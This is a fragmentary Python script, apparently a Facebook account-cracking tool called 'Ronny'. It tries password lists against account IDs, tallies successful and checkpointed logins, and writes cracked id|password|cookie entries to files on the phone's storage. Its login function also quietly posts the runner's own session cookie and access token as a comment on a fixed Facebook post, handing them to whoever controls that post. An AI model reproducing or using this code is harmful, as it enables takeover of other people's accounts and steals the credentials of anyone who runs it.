...
def login_men():
	try:
		...
		requests.post(f"https://graph.facebook.com/v15.0/100000054778311_6259878267357270/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
...
def passwrdh():
	...
	with prog:
		...
		yhg = '0'
		print(f'{xxx}─────────────────────────────')
		print(f'{hijo}+ {puti}Ronny ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}Ronny cp : {kun}{yhg}{xxx} ')
		print(f'{xxx}─────────────────────────────')
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#open('/sdcard/RONNY-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
				...
				open('/sdcard/RONNY-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
...
def passwrd():
	...
	with prog:
		...
		print(f'{xxx}─────────────────────────────')
		print(f'{hijo}+ {puti}Ronny ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}Ronny cp : {kun}%s{xxx} '%(cp))
		print(f'{xxx}─────────────────────────────')
...
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[blue] CP[/]:[blue]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
...
###----------#[ CREAT FILE ]#----------###
def memulai():
	try:os.mkdir('/sdcard/RONNY-OK')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.mkdir('/sdcard/RONNY-CP')
	except:pass
	login_baz()
